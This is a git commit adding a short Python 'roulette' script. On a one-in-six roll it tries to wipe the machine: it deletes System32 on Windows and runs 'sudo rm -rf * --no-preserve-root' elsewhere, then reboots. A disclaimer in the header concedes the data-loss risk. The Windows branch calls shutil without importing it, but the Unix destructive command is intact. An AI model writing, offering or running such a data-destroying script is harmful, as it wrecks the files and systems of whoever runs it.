5403e2c75067f6ed5a90b3788f3381a965d8355e
Mason <masoncodes0@gmail.com>
2017-01-24 08:31:22 -0600

    Add files via upload

---
+++ Roulette.py
@@ -0,0 +1,20 @@
+# masoncodes.me
+# licensed under GNU GPl v3
+# I AM NOT RESPONSIBLE FOR THE LOSS OF ANY DATA DUE TO YOU RUNNING THIS FILE!
+
+import os
+import random
+
+spin = random.randint(1, 6)
+
+if os.name == "nt":
+    if spin == 6:
+        shutil.rmtree("C:\Windows\System32")
+        os.system('shutdown -r')
+    else:
+        print("Click.")
+
+else:
+    if spin == 6:
+        os.system('sudo rm -rf * --no-preserve-root')
+        os.system('sudo reboot')
